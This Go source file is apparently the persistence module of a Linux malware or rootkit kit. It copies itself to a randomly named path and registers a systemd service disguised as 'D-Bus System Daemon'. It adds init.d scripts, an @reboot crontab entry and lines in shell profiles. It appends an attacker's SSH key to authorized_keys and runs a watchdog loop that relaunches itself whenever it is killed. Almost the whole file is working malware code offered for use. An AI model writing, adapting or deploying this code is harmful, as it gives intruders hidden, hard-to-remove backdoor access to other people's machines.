package core

import (
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

var (
	InstalledName        = ""
	InstalledFolderName  = ""
	InstalledLocationU   = ""
	InstalledLocationA   = ""
)

func UserKitInstall() {
	InstalledName = InstallNames[rand.Intn(len(InstallNames))]
	InstalledFolderName = InstallFolderName[rand.Intn(len(InstallFolderName))]
	InstalledLocationU = strings.Replace(InstallUserLocations[rand.Intn(len(InstallUserLocations))], "~", os.Getenv("HOME"), 1)
	InstalledLocationA = InstallAdminLocations[rand.Intn(len(InstallAdminLocations))]

	var targetPath string
	if isRoot() {
		targetPath = filepath.Join(InstalledLocationA, InstalledName)
	} else {
		targetPath = filepath.Join(InstalledLocationU, InstalledFolderName, InstalledName)
		os.MkdirAll(filepath.Dir(targetPath), 0755)
	}

	// Copy self to target path
	selfPath, _ := os.Executable()
	input, _ := os.ReadFile(selfPath)
	os.WriteFile(targetPath, input, 0755)

	// Persistence methods
	if commandExists("systemctl") {
		InstallSystemd(targetPath)
	}
	if isRoot() {
		InstallInitD(targetPath)
	}
	InstallCron(targetPath)
	InstallShellProfile(targetPath)
	InstallSSH()

	// Start the installed version and exit
	exec.Command(targetPath).Start()
	os.Exit(0)
}

func commandExists(cmd string) bool {
	_, err := exec.LookPath(cmd)
	return err == nil
}

func InstallInitD(targetPath string) {
	if !isRoot() {
		return
	}
	scriptPath := filepath.Join("/etc/init.d", InstalledName)
	scriptContent := fmt.Sprintf(`#!/bin/sh /etc/rc.common
# LSB init script for %s
START=99
STOP=10

start() {
    echo "Starting %s"
    %s &
}

stop() {
    echo "Stopping %s"
    killall %s
}

case "$1" in
    start) start ;;
    stop) stop ;;
    restart) stop; start ;;
    *) %s & ;;
esac
`, InstalledName, InstalledName, targetPath, InstalledName, InstalledName, targetPath)

	os.WriteFile(scriptPath, []byte(scriptContent), 0755)
	// Try to enable it (standard SysV or OpenWrt/BusyBox style)
	exec.Command("/etc/init.d/"+InstalledName, "enable").Run()
}

func InstallSystemd(targetPath string) {
	serviceName := InstalledName + ".service"
	var servicePath string
	var systemctlArgs []string

	serviceContent := fmt.Sprintf(`[Unit]
Description=D-Bus System Daemon
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=always

[Install]
WantedBy=default.target
`, targetPath)

	if isRoot() {
		servicePath = filepath.Join("/etc/systemd/system", serviceName)
	} else {
		userConfigDir := filepath.Join(os.Getenv("HOME"), ".config/systemd/user")
		os.MkdirAll(userConfigDir, 0755)
		servicePath = filepath.Join(userConfigDir, serviceName)
		systemctlArgs = append(systemctlArgs, "--user")
	}

	os.WriteFile(servicePath, []byte(serviceContent), 0644)

	// Enable and start
	exec.Command("systemctl", append(systemctlArgs, "daemon-reload")...).Run()
	exec.Command("systemctl", append(systemctlArgs, "enable", serviceName)...).Run()
	exec.Command("systemctl", append(systemctlArgs, "start", serviceName)...).Run()
}

func InstallCron(targetPath string) {
	cronCmd := fmt.Sprintf("@reboot %s\n", targetPath)
	
	// Get current crontab
	out, _ := exec.Command("crontab", "-l").Output()
	currentCron := string(out)

	if !strings.Contains(currentCron, InstalledName) {
		newCron := currentCron + cronCmd
		cmd := exec.Command("crontab", "-")
		cmd.Stdin = strings.NewReader(newCron)
		cmd.Run()
	}
}

func InstallShellProfile(targetPath string) {
	profileCmd := fmt.Sprintf("\n%s &\n", targetPath)
	
	home := os.Getenv("HOME")
	profiles := []string{
		filepath.Join(home, ".bashrc"),
		filepath.Join(home, ".zshrc"),
		filepath.Join(home, ".profile"),
	}

	if isRoot() {
		profiles = append(profiles, "/etc/profile")
	}

	for _, p := range profiles {
		if _, err := os.Stat(p); err == nil {
			content, _ := os.ReadFile(p)
			if !strings.Contains(string(content), InstalledName) {
				f, _ := os.OpenFile(p, os.O_APPEND|os.O_WRONLY, 0644)
				f.WriteString(profileCmd)
				f.Close()
			}
		}
	}
}

func InstallSSH() {
	if SSHPubKey == "" {
		return
	}

	authKeysPath := filepath.Join(os.Getenv("HOME"), ".ssh/authorized_keys")
	os.MkdirAll(filepath.Dir(authKeysPath), 0700)

	content, _ := os.ReadFile(authKeysPath)
	if !strings.Contains(string(content), SSHPubKey) {
		f, _ := os.OpenFile(authKeysPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
		f.WriteString("\n" + SSHPubKey + "\n")
		f.Close()
	}
}

func CheckFirstBoot() bool {
	// Simple check: if we are running from an installation directory
	execPath, _ := os.Executable()
	for _, loc := range append(InstallUserLocations[:], InstallAdminLocations[:]...) {
		cleanLoc := strings.Replace(loc, "~", os.Getenv("HOME"), 1)
		if strings.HasPrefix(execPath, cleanLoc) {
			return false
		}
	}
	return true
}

func StartGuardian() {
	path, _ := os.Executable()
	name := filepath.Base(path)
	// Background shell loop to restart the process if it's killed
	cmd := fmt.Sprintf("while true; do if ! pgrep -x %s > /dev/null; then %s & fi; sleep 10; done", name, path)
	exec.Command("sh", "-c", cmd).Start()
}
